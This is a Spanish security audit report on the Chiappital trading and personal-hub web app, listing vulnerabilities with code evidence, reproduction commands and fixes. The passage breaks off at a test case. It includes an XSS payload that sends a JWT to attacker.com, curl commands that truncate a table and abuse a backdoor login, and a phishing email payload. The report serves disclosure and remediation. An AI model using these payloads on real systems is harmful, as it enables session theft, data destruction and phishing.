# Auditoría Integral de Seguridad, Gestión y Lógica de Negocio — Chiappital

**Fecha de emisión:** 6 de Noviembre de 2026  
**Auditor:** Senior Software Security Auditor, Backend Architect & QA Engineer  
**Objetivo de la auditoría:** Investigación exhaustiva del proyecto Chiappital (Frontend, Backend, Base de Datos, Autenticación, Integraciones de Mercado y Flujos de Gestión) para identificar vulnerabilidades de seguridad, fallas lógicas de negocio, inconsistencias de datos y riesgos operativos que provoquen caídas en producción (como errores HTTP 503).  
**Clasificación de confidencialidad:** Confidencial / Interno  

---

## 1. Resumen Ejecutivo

Durante la auditoría técnica integral de la plataforma **Chiappital**, se examinaron exhaustivamente el backend (Node.js/Express con MySQL2), el frontend (React 19/Vite), la capa de autenticación JWT, los servicios de mercado (Finnhub, Yahoo Finance), los módulos de gestión (Trading, Balances, Métricas Históricas, Hub Personal y Segundo Cerebro/Knowledge Hub) y la configuración de despliegue en Hostinger.

### Postura de Seguridad y Nivel de Riesgo Global: **CRÍTICO**

El sistema presenta una arquitectura funcionalmente rica y bien estructurada en su separación de módulos, pero expone **vulnerabilidades críticas directas** que ponen en riesgo la continuidad operativa de la web, la integridad del portafolio financiero y la privacidad de los usuarios.

Entre los hallazgos más graves se identificaron:
1. **Truncado de base de datos no autenticado (`POST /api/market/truncate-snapshot`)**: Cualquier visitante o bot de internet puede vaciar la tabla de snapshots del mercado con una simple llamada HTTP.
2. **Bypass de autenticación mediante palabra clave estática (`POST /api/auth/family`)**: Una clave fija de 4 letras otorga privilegios administrativos completos de 7 días sobre la cuenta principal (`teochiapps@gmail.com`).
3. **Múltiples IDORs (Insecure Direct Object Reference) en el Hub Personal**: Usuarios autenticados pueden consultar y modificar revisiones de tarjetas y leer diarios privados de otros usuarios sin restricción de pertenencia.
4. **Ventas parciales de trading sin atomicidad ACID**: El frontend ejecuta la venta parcial mediante dos peticiones HTTP independientes y secuenciales (`updateTrade` y luego `createTrade`), arriesgando pérdida irreparable de datos financieros ante cortes de red.
5. **Causa raíz de los incidentes de servicio no disponible (HTTP 503)**: El servidor ejecuta tareas pesadas no autenticadas (como backtesting histórico de 3 años y llamadas a Yahoo Finance en el event loop principal) que bloquean el proceso de Node.js, saturando el pool de conexiones de MySQL y provocando que el proxy inverso (LiteSpeed en Hostinger) devuelva error 503 ("Service Unavailable").

### Métricas de Hallazgos

| Severidad | Cantidad | Descripción General |
| :--- | :---: | :--- |
| **Crítica** | **3** | Acceso no autorizado administrativo, destrucción de datos sin auth y fugas de datos directas. |
| **Alta** | **5** | Subida de archivos arbitraria, XSS almacenado con robo de tokens, desincronización de trades y Open Relay. |
| **Media** | **5** | Descarga no autorizada de backups, CORS permisivo, DoS por backtesting público y API keys expuestas. |
| **Baja** | **3** | Falta de rate limiting en login, overhead en autenticación JWT y borrado en cascada sin soft-delete. |
| **Total** | **16** | **Hallazgos confirmados con evidencia en código fuente** |

---

## 2. Arquitectura Analizada

```
+-----------------------------------------------------------------------------------+
|                                 CLIENT (BROWSER)                                  |
|   React 19 + Vite | styled-components | marked (sin DOMPurify) | localStorage JWT |
+-----------------------------------------------------------------------------------+
                                          |
                        HTTPS (REST API)  |  Preflight CORS / Authorization Bearer
                                          v
+-----------------------------------------------------------------------------------+
|                        HOSTINGER REVERSE PROXY (LiteSpeed)                        |
|   Falla con 503 cuando el proceso Node.js no responde a tiempo o crashea          |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        BACKEND API (Node.js + Express 4.x)                        |
|   - Middleware: cors, express.json, authenticate (JWT)                            |
|   - Rutas Públicas: /api/market/* (parcial), /api/backtesting/*, /api/auth/family |
|   - Almacenamiento Estático: /uploads (Multer sin filtro de extensiones)          |
|   - Schedulers: setInterval (MarketSync cada 1 min, Daily Snapshots)              |
+-----------------------------------------------------------------------------------+
                     |                                           |
                     v                                           v
+------------------------------------+   +------------------------------------------+
|       MYSQL 8 (InnoDB Pool)        |   |           SERVICIOS EXTERNOS             |
|  - Host: 127.0.0.1 / srv812        |   |  - Finnhub API (Market Quotes)           |
|  - Conexiones: max 10              |   |  - Yahoo Finance (Historical Candles)    |
|  - Users, Trades, Balances,        |   |  - Hostinger SMTP (Nodemailer)           |
|    Knowledge, Personal Hub         |   +------------------------------------------+
+------------------------------------+
```

- **Frontend**: Single Page Application (SPA) desarrollada en React 19 con empaquetado Vite. Gestiona el estado de autenticación en `localStorage` (`st_token` y `st_user`) y se comunica mediante `fetch` centralizado en `src/services/apiService.js`.
- **Backend**: Servidor Node.js con Express modular montado en `Chiappital/api/server.js`. Emplea un pool de conexiones `mysql2/promise` limitado a 10 conexiones concurrentes.
- **Autenticación**: JSON Web Tokens (JWT) firmados con clave secreta asimétrica (`JWT_SECRET`), con una duración de 7 días.
- **Almacenamiento de archivos**: Sistema de archivos local (`api/public/uploads`), servido directamente como contenido estático público bajo `/uploads`.

---

## 3. Hallazgos Clasificados por Severidad

---

### 3.1 Severidad Crítica

#### [SEC-CRIT-01] Truncado manual de tabla de base de datos sin autenticación
- **Severidad:** Crítica
- **Categoría:** Seguridad / Integridad de Datos
- **Ubicación:** `Chiappital/api/routes/market.js` (Líneas 81–93)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Bajo (1 hora)

**Evidencia técnica:**
```javascript
// POST /api/market/truncate-snapshot
router.post('/truncate-snapshot', async (req, res) => {
  try {
    const db = getPool();
    await db.query('TRUNCATE TABLE market_snapshot');
    const logger = require('../utils/logger');
    logger.info('System', 'market_snapshot table truncated manually.');
    res.json({ message: 'Table truncated successfully' });
  } catch (error) {
    console.error('Error truncating table:', error);
    res.status(500).json({ error: 'Error truncating table' });
  }
});
```

**Escenario de fallo / Reproducción:**
El archivo `api/routes/market.js` no aplica el middleware `authenticate` a nivel de enrutador. Cualquier usuario no autenticado o crawler que ejecute:
```bash
curl -X POST https://apichiappital.surcodes.com/api/market/truncate-snapshot
```
eliminará de inmediato y sin confirmación todos los registros de la tabla `market_snapshot`.

**Impacto en el negocio:**
Pérdida instantánea del estado de mercado, cotizaciones previas, drawdowns de 52 semanas y datos sincronizados. Provoca que las pantallas de screener y estrategia queden vacías para todos los clientes, obligando a una resincronización de emergencia contra las APIs externas.

**Solución recomendada:**
1. Proteger la ruta con `authenticate` y exigir rol de administrador (`req.user.role === 'admin'`).
2. Deshabilitar completamente este endpoint en entornos de producción (`process.env.NODE_ENV === 'production'`) o moverlo a un script de mantenimiento interno por CLI.

---

#### [SEC-CRIT-02] Puerta trasera de autenticación familiar con palabra clave fija y escalada a Administrador
- **Severidad:** Crítica
- **Categoría:** Seguridad / Control de Acceso
- **Ubicación:** `Chiappital/api/routes/auth.js` (Líneas 83–127)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Bajo (1 hora)

**Evidencia técnica:**
```javascript
// POST /api/auth/family
router.post('/family', async (req, res) => {
  try {
    const { answer } = req.body;

    if (!answer || answer.trim().toLowerCase() !== '[REDACTED_PALABRA_FAMILIAR]') {
      return res.status(400).json({
        error: { message: 'Respuesta incorrecta.' }
      });
    }

    const email = 'teochiapps@gmail.com'; // El usuario principal
    const db = getPool();
    const [rows] = await db.execute('SELECT id, username, email FROM users WHERE email = ?', [email]);
    // ...
    const user = rows[0];
    const token = generateToken(user.id); // Token JWT válido por 7 días
    return res.json({ jwt: token, user: { ... } });
```

**Escenario de fallo / Reproducción:**
Cualquier actor que descubra o adivine la palabra clave fija mediante ataque de diccionario simple (es una sola palabra en minúsculas) puede enviar:
```bash
curl -X POST https://apichiappital.surcodes.com/api/auth/family \
  -H "Content-Type: application/json" \
  -d '{"answer":"[REDACTED]"}'
```
El servidor emitirá un token JWT válido por 7 días a nombre de la cuenta administradora (`teochiapps@gmail.com`), concediendo control irrestricto sobre los balances, compras/ventas, bitácora personal y notas de conocimiento.

**Impacto en el negocio:**
Compromiso total del sistema (Account Takeover administrativo completo). Violación de confidencialidad e integridad de todos los datos financieros y personales.

**Solución recomendada:**
1. Eliminar de inmediato el endpoint `/api/auth/family` o reemplazarlo por cuentas individuales con contraseña segura, hash bcrypt y verificación de dos factores (2FA).
2. Si se requiere un rol familiar/invitado, crear en la base de datos usuarios con rol `'viewer'` o `'guest'` con permisos de solo lectura (`SELECT`) y sin acceso a modificación de trades ni al Hub Personal.

---

#### [SEC-CRIT-03] Vulnerabilidad IDOR masiva en Hub Personal (Fuga y sobrescritura de recursos ajenos)
- **Severidad:** Crítica
- **Categoría:** Seguridad / Autorización
- **Ubicación:** `Chiappital/api/routes/personal.js` (Líneas 368–375, 514–522, 671–679, 810–821)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Medio (3 horas)

**Evidencia técnica:**
En la actualización de repasos del algoritmo SuperMemo-2 (`vocabulary`, `mental_models`, `cybersecurity_cards`), el `UPDATE` y el `SELECT` posterior ignoran `user_id`:
```javascript
// Línea 368-375 (Vocabulary)
await db.execute(
  `UPDATE vocabulary SET repetition = ?, ease_factor = ?, interval_days = ?, next_review = ? WHERE id = ?`,
  [repetition, ease_factor, interval_days, nextReviewStr, req.params.id] // Falta AND user_id = ?
);
const [updatedRows] = await db.execute('SELECT * FROM vocabulary WHERE id = ?', [req.params.id]);
res.json({ word: updatedRows[0] });
```
Y en el diario personal (`journals`), la consulta de retorno permite lectura no autorizada:
```javascript
// Línea 810-821 (Journals)
await db.execute(
  'UPDATE journals SET content = ? WHERE id = ? AND user_id = ?',
  [content || '', req.params.id, userId]
);
// Si id=5 pertenece a otro usuario, UPDATE afecta 0 filas, pero el SELECT siguiente lo retorna:
const [rows] = await db.execute('SELECT * FROM journals WHERE id = ?', [req.params.id]);
const journal = rows[0];
res.json({ journal }); // Fuga del contenido privado de otro usuario
```

**Escenario de fallo / Reproducción:**
1. El Usuario B envía un `PUT /api/personal/journals/12` enviando `{ "content": "test" }`.
2. Como el ID 12 pertenece al Usuario A, el `UPDATE` no altera filas.
3. El backend ejecuta inmediatamente `SELECT * FROM journals WHERE id = 12` sin filtrar por `user_id`, y responde con el texto íntimo y privado del diario del Usuario A.

**Impacto en el negocio:**
Exfiltración de información confidencial personal y daño directo a la integridad del progreso de aprendizaje de los usuarios.

**Solución recomendada:**
En todas las sentencias SQL de lectura, actualización y eliminación, añadir estrictamente la cláusula `AND user_id = ?`:
```javascript
const [rows] = await db.execute('SELECT * FROM journals WHERE id = ? AND user_id = ?', [req.params.id, userId]);
if (rows.length === 0) return res.status(404).json({ error: { message: 'Registro no encontrado.' } });
```

---

### 3.2 Severidad Alta

#### [SEC-HIGH-01] Subida de archivos no restringida (Arbitrary File Upload) servida estáticamente
- **Severidad:** Alta
- **Categoría:** Seguridad / OWASP A04: Insecure Design
- **Ubicación:** `Chiappital/api/routes/knowledge.js` (Líneas 19–34), `api/routes/alerts.js` (Líneas 11–25), `api/server.js` (Línea 85)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Medio (2 horas)

**Evidencia técnica:**
```javascript
const storage = multer.diskStorage({
  destination: function (req, file, cb) { cb(null, uploadsDir); },
  filename: function (req, file, cb) {
    const ext = path.extname(file.originalname);
    const base = path.basename(file.originalname, ext).replace(/[^a-zA-Z0-9_-]/g, '_');
    const unique = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, `knowledge-${base}-${unique}${ext}`);
  }
});
const upload = multer({ storage, limits: { fileSize: 25 * 1024 * 1024 } });
```
Y en `api/server.js`:
```javascript
app.use('/uploads', express.static(path.join(__dirname, 'public/uploads')));
```

**Escenario de fallo / Reproducción:**
El middleware de `multer` no define un `fileFilter` ni valida tipos MIME ni extensiones permitidas. Un usuario malicioso puede adjuntar un archivo `.html`, `.svg` o `.shtml` conteniendo código JavaScript malicioso. El archivo queda alojado bajo `https://apichiappital.surcodes.com/uploads/knowledge-...html`. Al enviar dicho enlace a otro usuario o al administrador, se ejecuta código en el contexto del dominio de la API.

**Impacto en el negocio:**
Stored XSS, robo de cookies de sesión, phishing alojado bajo el dominio legítimo y potencial ejecución remota si el entorno de hosting LiteSpeed tuviera handlers de scripts (.php/.cgi) habilitados en carpetas de uploads.

**Solución recomendada:**
1. Implementar `fileFilter` en Multer para restringir estrictamente las extensiones (`.jpg`, `.jpeg`, `.png`, `.webp`, `.pdf`).
2. Validar el magic number (firma binaria real) con librerías como `file-type`.
3. Servir adjuntos con headers `Content-Disposition: attachment` y `X-Content-Type-Options: nosniff`.

---

#### [SEC-HIGH-02] Stored XSS en el Frontend mediante `dangerouslySetInnerHTML` y `marked.parse`
- **Severidad:** Alta
- **Categoría:** Seguridad / OWASP A03: Injection (XSS)
- **Ubicación:**
  * `Chiappital/src/modules/knowledge/pages/NotesPage.jsx` (Líneas 335, 687)
  * `Chiappital/src/modules/personal/pages/JournalPage.jsx` (Línea 292)
  * `Chiappital/src/components/Dashboard/MarketStrategy.jsx` (Línea 114)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Medio (2 horas)

**Evidencia técnica:**
```javascript
// NotesPage.jsx (Línea 335 y 687)
const renderedHtml = useMemo(() => {
  // ...
  return marked.parse(parsedWikiLinks); // No pasa por DOMPurify
}, [content]);

// Línea 687:
<PreviewContent dangerouslySetInnerHTML={{ __html: renderedHtml }} />
```

**Escenario de fallo / Reproducción:**
Si una nota de conocimiento o estrategia de mercado contiene un payload Markdown con etiquetas HTML:
```markdown
<img src=x onerror="fetch('https://attacker.com/steal?token=' + localStorage.getItem('st_token'))">
```
El parser `marked` procesa el HTML crudo y React lo inyecta directamente al DOM mediante `dangerouslySetInnerHTML`. El script se ejecuta en el navegador del usuario y exfiltra el token JWT almacenado en `localStorage`.

**Impacto en el negocio:**
Robo de sesiones de usuario y administrador en el cliente, permitiendo el control completo de la cuenta víctima.

**Solución recomendada:**
Instalar y aplicar `dompurify` antes de cualquier renderizado con `dangerouslySetInnerHTML`:
```javascript
import DOMPurify from 'dompurify';
// ...
const sanitized = DOMPurify.sanitize(marked.parse(content));
<PreviewContent dangerouslySetInnerHTML={{ __html: sanitized }} />
```

---

#### [BIZ-HIGH-01] Pérdida de datos e inconsistencia en ventas parciales de trading sin transacción ACID
- **Severidad:** Alta
- **Categoría:** Lógica de Negocio / Integridad de Datos
- **Ubicación:** `Chiappital/src/services/apiService.js` (Líneas 231–262) y `Chiappital/api/routes/trades.js` (Líneas 121–175)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Alto (4 horas)

**Evidencia técnica:**
```javascript
// apiService.js (closeTrade)
// Paso 1: Actualizar la posición abierta con el remanente
await this.updateTrade(tradeId, { portfolio_percentage: remPct });

// Paso 2: Crear el nuevo trade cerrado por la porción vendida
return await this.createTrade(closedTradeData, getAttr('account_type') || 'propia');
```

**Escenario de fallo / Reproducción:**
1. El usuario tiene una posición abierta del 10% y decide vender el 50% (quedando 5%).
2. El cliente ejecuta el Paso 1 (`PUT /api/trades/:id`), reduciendo exitosamente el trade a 5% en la BD.
3. Antes de ejecutarse el Paso 2 (`POST /api/trades`), ocurre un microcorte de red, caída de batería, o el backend responde con un error 500/503.
4. Resultado: El porcentaje original del 5% restante se pierde. El 5% vendido jamás se registra como trade cerrado ni computa ganancias/pérdidas en el historial.

**Impacto en el negocio:**
Pérdida permanente e irreversible de registros de trading financiero y distorsión total de los reportes de rendimiento y balances.

**Solución recomendada:**
Mover la lógica de venta parcial íntegramente al backend en un único endpoint transaccional (`POST /api/trades/:id/partial-close`):
```javascript
const connection = await db.getConnection();
try {
  await connection.beginTransaction();
  await connection.execute('UPDATE trades SET portfolio_percentage = ? WHERE id = ?', [remPct, tradeId]);
  await connection.execute('INSERT INTO trades (...) VALUES (...)', [...]);
  await connection.commit();
} catch (err) {
  await connection.rollback();
  throw err;
} finally {
  connection.release();
}
```

---

#### [BIZ-HIGH-02] Confianza ciega en cálculos financieros enviados por el cliente (`result` y `current_capital`)
- **Severidad:** Alta
- **Categoría:** Lógica de Negocio / Integridad
- **Ubicación:** `Chiappital/api/routes/trades.js` (Líneas 150–163), `api/routes/balances.js` (Líneas 77–85)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Medio (2 horas)

**Evidencia técnica:**
El backend acepta el valor de rendimiento `result` directamente en el payload `body.result` sin verificarlo contra el precio de entrada y salida:
```javascript
// routes/trades.js
const allowedFields = [ ..., 'status', 'result', 'closed_at' ];
// Se escribe directamente el result provisto por el cliente
```
Y en `routes/balances.js`:
```javascript
let currentCapital = req.query.current_capital ? parseFloat(req.query.current_capital) : null;
// Si el cliente envía ?current_capital=999999, se calcula el drawdown sobre ese número inventado
```

**Escenario de fallo / Reproducción:**
Un usuario o extensión maliciosa intercepta la petición de cierre de trade y envía `result: 1500.5` en un trade que en realidad perdió un 20%. El backend almacena el `1500.5%` sin validación.

**Impacto en el negocio:**
Falsificación de estadísticas de rendimiento del portafolio, cálculo erróneo del Win Rate y adulteración de métricas presentadas a inversores o copropietarios de cuentas compartidas.

**Solución recomendada:**
El backend debe calcular de forma autoritativa el `result`:
```javascript
if (status === 'closed') {
  const resultCalculated = type === 'buy'
    ? ((exit_price - entry_price) / entry_price) * 100
    : ((entry_price - exit_price) / entry_price) * 100;
  // Guardar resultCalculated en la BD
}
```

---

#### [SEC-HIGH-03] Open Relay de correo electrónico e inyección HTML en notificaciones SMTP
- **Severidad:** Alta
- **Categoría:** Seguridad / Abuso de Infraestructura
- **Ubicación:** `Chiappital/api/routes/historicalMetrics.js` (Líneas 130–180), `api/routes/alerts.js` (Líneas 379–425)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Medio (2 horas)

**Evidencia técnica:**
```javascript
// routes/historicalMetrics.js
const { recipient, customMessage, monthData, accountName } = req.body;
// Concatena customMessage directamente en el HTML sin escape
let html = `... <div class="message">${customMessage}</div> ...`;
await sendEmail(recipient, subject, html);
```

**Escenario de fallo / Reproducción:**
Un usuario autenticado (o cualquiera mediante el token familiar de la vulnerabilidad `SEC-CRIT-02`) envía solicitudes `POST /api/historical-metrics/send-summary` con:
```json
{
  "recipient": "victima@externa.com",
  "customMessage": "<a href='https://phishing.site'>Haga clic aquí para restablecer su clave bancaria</a>"
}
```
El servidor utiliza las credenciales SMTP corporativas de Hostinger para despachar correos electrónicos arbitrarios a cualquier casilla externa, conteniendo enlaces de suplantación de identidad (phishing).

**Impacto en el negocio:**
Inclusión del dominio `surcodes.com` y de la IP del servidor en listas negras internacionales de SPAM (RBL/Spamhaus), provocando que los correos legítimos no lleguen a destino.

**Solución recomendada:**
1. Restringir los destinatarios únicamente a la dirección de correo registrada del usuario autenticado (`req.user.email`).
2. Escapar rigurosamente cualquier texto de usuario (`customMessage`) antes de interpolarlo en el template HTML.
3. Aplicar límite de tasa (`express-rate-limit`) a los endpoints de envío de correos (ej. máx. 5 correos por hora por usuario).

---

### 3.3 Severidad Media

#### [SEC-MED-01] Descarga no autorizada de exportaciones de conocimiento (Vault IDOR)
- **Severidad:** Media
- **Categoría:** Seguridad / Control de Acceso
- **Ubicación:** `Chiappital/api/routes/knowledge.js` (Líneas 1785–1802), `api/services/knowledgeExportService.js` (Línea 676)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Bajo (1 hora)

**Evidencia técnica:**
El mapa `exportJobs` en memoria almacena los trabajos de exportación sin registrar el `userId`. Al consultar `GET /api/knowledge/export/:id/download`, no se valida si el usuario solicitante es el dueño del zip generado.

**Impacto en el negocio:**
Cualquier usuario con un token válido puede descargar los archivos comprimidos de notas privadas de otros usuarios si obtiene el ID de exportación.

**Solución recomendada:**
Almacenar `userId: req.user.id` dentro del objeto `jobInfo` y validar `if (job.userId !== req.user.id) return res.status(403)...`.

---

#### [SEC-MED-02] Política de CORS excesivamente permisiva para subdominios compartidos
- **Severidad:** Media
- **Categoría:** Seguridad / Configuración
- **Ubicación:** `Chiappital/api/server.js` (Líneas 55–70)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Bajo (30 min)

**Evidencia técnica:**
```javascript
if (/^https?:\/\/([a-zA-Z0-9-]+\.)*hostingersite\.com(:\d+)?$/.test(origin)) return true;
// Combinado con:
credentials: true
```

**Impacto en el negocio:**
`hostingersite.com` es un dominio genérico compartido por todos los clientes de Hostinger a nivel global. Cualquier sitio web de un tercero alojado en Hostinger bajo `*.hostingersite.com` tiene autorización CORS para hacer peticiones autenticadas contra `apichiappital.surcodes.com`.

**Solución recomendada:**
Eliminar la regla genérica de `hostingersite.com` y permitir únicamente los subdominios de producción específicos (`https://chiappital.surcodes.com`).

---

#### [PERF-MED-01] Endpoints públicos no autenticados que provocan agotamiento de CPU y error 503
- **Severidad:** Media (Riesgo Operativo Alto)
- **Categoría:** Estabilidad / Rendimiento
- **Ubicación:** `Chiappital/api/routes/market.js` (Líneas 66, 95) y `Chiappital/api/routes/backtesting.js` (Línea 23)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Medio (2 horas)

**Evidencia técnica:**
El endpoint `GET /api/backtesting/:ticker` es público y procesa 3 años de cotizaciones diarias en CPU sin paginación ni autenticación:
```javascript
router.get('/:ticker', async (req, res) => {
  // Procesa hasta 3 años de velas diarias, calcula indicadores y simulaciones
```
Y `POST /api/market/sync-now` permite a cualquiera forzar el barrido completo de todas las acciones de la base de datos contra Finnhub.

**Impacto en el negocio:**
Explica directamente los errores **503 Service Unavailable** observados en producción. Cuando múltiples peticiones o bots tocan estas rutas, el bucle de eventos de Node.js se congela o se agota la memoria asignada en el cPanel de Hostinger, provocando que LiteSpeed dé de baja el worker.

**Solución recomendada:**
1. Proteger `/api/backtesting/:ticker` y `/api/market/sync-now` con autenticación obligatoria.
2. Limitar el backtesting a un máximo de 1 ejecución concurrente por usuario.
3. Desacoplar tareas intensivas de CPU mediante micro-lotes o workers en segundo plano.

---

#### [ADM-MED-01] Sobrescritura destructiva de snapshots históricos de ATH sin trazabilidad
- **Severidad:** Media
- **Categoría:** Gestión / Integridad de Datos
- **Ubicación:** `Chiappital/api/routes/balances.js` (Líneas 146–150)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Bajo (1 hora)

**Evidencia técnica:**
```javascript
// Actualizar el snapshot más alto al nuevo ATH
const topSnapshot = existing[0];
await db.execute(
  'UPDATE portfolio_snapshots SET total_usd = ? WHERE id = ?',
  [ath, topSnapshot.id]
);
```

**Impacto en el negocio:**
Modifica arbitrariamente el registro histórico más antiguo en lugar de crear un nuevo hito con la fecha real del nuevo récord financiero. Destruye la fidelidad del gráfico de evolución patrimonial a lo largo del tiempo.

**Solución recomendada:**
Nunca sobrescribir snapshots anteriores; registrar siempre un nuevo snapshot con la fecha actual cuando se alcance un nuevo All-Time High.

---

#### [SEC-MED-03] Clave de API de Finnhub embebida en el código del Frontend
- **Severidad:** Media
- **Categoría:** Seguridad / Gestión de Secretos
- **Ubicación:** `Chiappital/src/config/environment.js` (Línea 12) y `Chiappital/src/config/priceConfig.js` (Línea 13)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Bajo (1 hora)

**Evidencia técnica:**
```javascript
FINNHUB_API_KEY: import.meta.env.VITE_FINNHUB_API_KEY || 'd3t6mg9r01qq...[REDACTED]'
```

**Impacto en el negocio:**
La clave queda visible en el archivo empaquetado `index-*.js` descargable por cualquier persona. Terceros pueden sustraer la clave y consumir la cuota de llamadas API gratuitas de Finnhub, dejando al sistema sin cotizaciones en tiempo real.

**Solución recomendada:**
Canalizar todas las consultas a Finnhub exclusivamente a través del backend (`/api/market/*`), evitando exponer credenciales en el cliente web.

---

### 3.4 Severidad Baja

#### [SEC-LOW-01] Ausencia de limitación de tasa (Rate Limiting) en autenticación
- **Severidad:** Baja
- **Categoría:** Seguridad / Anti-Fuerza Bruta
- **Ubicación:** `Chiappital/api/server.js`, `Chiappital/api/routes/auth.js`
- **Estado:** Confirmado
- **Esfuerzo estimado:** Bajo (1 hora)

**Evidencia técnica:**
No se implementa `express-rate-limit` en ninguna de las rutas de login (`/api/auth/login`, `/api/auth/local`). Se permiten intentos infinitos por segundo contra contraseñas de usuarios.

**Solución recomendada:**
Incorporar `express-rate-limit` configurado a 5 intentos fallidos cada 15 minutos por dirección IP.

---

#### [ARCH-LOW-01] Consulta síncrona a la base de datos en cada petición HTTP autenticada
- **Severidad:** Baja
- **Categoría:** Rendimiento / Arquitectura
- **Ubicación:** `Chiappital/api/middleware/auth.js` (Líneas 45–50)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Medio (2 horas)

**Evidencia técnica:**
```javascript
const [rows] = await db.execute('SELECT id, username, email FROM users WHERE id = ?', [userId]);
```
Cada llamada a cualquier endpoint protegido ejecuta una consulta SQL a la tabla `users`, agotando rápidamente el pool de 10 conexiones simultáneas cuando hay varias peticiones concurrentes en la misma pantalla.

**Solución recomendada:**
Incluir los datos mínimos requeridos en el payload firmado del JWT o cachear el estado del usuario en memoria con un TTL breve (ej. 5 minutos).

---

#### [BIZ-LOW-01] Eliminación en cascada física (`ON DELETE CASCADE`) sin soft-delete
- **Severidad:** Baja
- **Categoría:** Gestión / Resiliencia
- **Ubicación:** `Chiappital/api/database/db.js` (Líneas 104, 119, 133, 922, etc.)
- **Estado:** Confirmado
- **Esfuerzo estimado:** Medio (3 horas)

**Evidencia técnica:**
Todas las tablas maestras tienen relaciones con `ON DELETE CASCADE` hacia la tabla `users`. Si una fila de usuario es eliminada por error en base de datos, se borran instantánea y definitivamente todos los trades, balances, hábitos y notas.

**Solución recomendada:**
Implementar una columna `is_active` o `deleted_at` (soft-delete) para prevenir la destrucción accidental de datos históricos.

---

## 4. Matriz de Priorización de Hallazgos

| ID | Hallazgo | Severidad | Esfuerzo | Prioridad de Acción |
| :--- | :--- | :---: | :---: | :---: |
| **SEC-CRIT-01** | Truncado público de tabla `market_snapshot` | **Crítica** | Bajo | **P0 (Inmediato)** |
| **SEC-CRIT-02** | Puerta trasera familiar con bypass de contraseña | **Crítica** | Bajo | **P0 (Inmediato)** |
| **SEC-CRIT-03** | Múltiples IDORs en Hub Personal y Diarios | **Crítica** | Medio | **P0 (Inmediato)** |
| **SEC-HIGH-01** | Subida de archivos arbitraria sin filtro en Multer | **Alta** | Medio | **P1 (Urgente)** |
| **SEC-HIGH-02** | Stored XSS en Notes y Journals sin DOMPurify | **Alta** | Medio | **P1 (Urgente)** |
| **BIZ-HIGH-01** | Desincronización no transaccional en ventas parciales | **Alta** | Alto | **P1 (Urgente)** |
| **BIZ-HIGH-02** | Modificación no validada de rendimientos (`result`) | **Alta** | Medio | **P1 (Urgente)** |
| **SEC-HIGH-03** | Open Relay de correos con inyección HTML | **Alta** | Medio | **P1 (Urgente)** |
| **PERF-MED-01** | CPU exhaust & DoS en Backtesting (Causa de 503) | **Media** | Medio | **P2 (Importante)** |
| **SEC-MED-01** | IDOR en descargas de vaults de conocimiento | **Media** | Bajo | **P2 (Importante)** |
| **SEC-MED-02** | CORS permisivo con `hostingersite.com` | **Media** | Bajo | **P2 (Importante)** |
| **ADM-MED-01** | Sobrescritura destructiva de registros ATH | **Media** | Bajo | **P2 (Importante)** |
| **SEC-MED-03** | Clave Finnhub hardcodeada en el Frontend | **Media** | Bajo | **P2 (Importante)** |
| **SEC-LOW-01** | Ausencia de Rate Limiting en autenticación | **Baja** | Bajo | **P3 (Mantenimiento)** |
| **ARCH-LOW-01** | Consultas redundantes a tabla `users` por JWT | **Baja** | Medio | **P3 (Mantenimiento)** |
| **BIZ-LOW-01** | Borrado en cascada físico sin Soft Delete | **Baja** | Medio | **P3 (Mantenimiento)** |

---

## 5. Plan de Remediación Priorizado

```
+--------------------------------------------------------------------------------+
| FASE 1: HOTFIXES DE SEGURIDAD CRÍTICA (Primeras 24 - 48 Horas)                 |
| - Proteger/eliminar /api/market/truncate-snapshot                              |
| - Desactivar o migrar el endpoint de login familiar con clave estática         |
| - Corregir cláusulas WHERE user_id en todos los endpoints de personal.js       |
| - Cerrar el Open Relay y filtrar destinatarios en envío de emails              |
+--------------------------------------------------------------------------------+
                                       |
                                       v
+--------------------------------------------------------------------------------+
| FASE 2: BLINDAJE DE INTEGRIDAD Y FRONTEND (Semana 1 - 2)                       |
| - Implementar DOMPurify en frontend (NotesPage, JournalPage, MarketStrategy)   |
| - Implementar endpoint transaccional para ventas parciales en Backend          |
| - Calcular y validar 'result' y 'current_capital' en el servidor               |
| - Restringir tipos MIME y firmas de archivo en Multer                          |
| - Ajustar regex de CORS a dominios productivos estrictos                       |
+--------------------------------------------------------------------------------+
                                       |
                                       v
+--------------------------------------------------------------------------------+
| FASE 3: RESILIENCIA OPERATIVA Y ESTABILIDAD (Semana 3 - 4)                     |
| - Autenticar y throttler en Backtesting y Sync de mercado (Solución al 503)    |
| - Implementar express-rate-limit en login y endpoints públicos                 |
| - Migrar claves de terceros fuera del código frontend                          |
| - Implementar Soft Delete en tablas críticas de inversiones                    |
+--------------------------------------------------------------------------------+
```

---

## 6. Casos de Prueba Recomendados (QA Verification Suite)

### 6.1 Pruebas de Seguridad y Control de Acceso
1. **TC-SEC-01 (Verificación de protección de truncado):**
   - *Acción:* Ejecutar `POST /api/market/truncate-snapshot` sin encabezado `Authorization`.
   - *Resultado esperado:* HTTP 401 Unauthorized. Ninguna fila borrada de la base de datos.
2. **TC-SEC-02 (Aislamiento de IDOR en Hub Personal):**
   - *Acción:* Con el Usuario A autenticado, enviar `PUT /api/personal/journals/:id_del_usuario_B` con payload de prueba.
   - *Resultado esperado:* HTTP 404 Not Found o 403 Forbidden. El contenido del diario del Usuario B no debe figurar en la respuesta.
3. **TC-SEC-03 (Mitigación de XSS en Notas):**
   - *Acción:* Crear una nota de conocimiento con el contenido `<img src=x onerror="alert(1)">`.
   - *Resultado esperado:* DOMPurify remueve el atributo `onerror` o la etiqueta; ningún script se ejecuta al alternar la vista previa.

### 6.2 Pruebas de Lógica de Negocio y Consistencia
4. **TC-BIZ-01 (Atomicidad en Venta Parcial):**
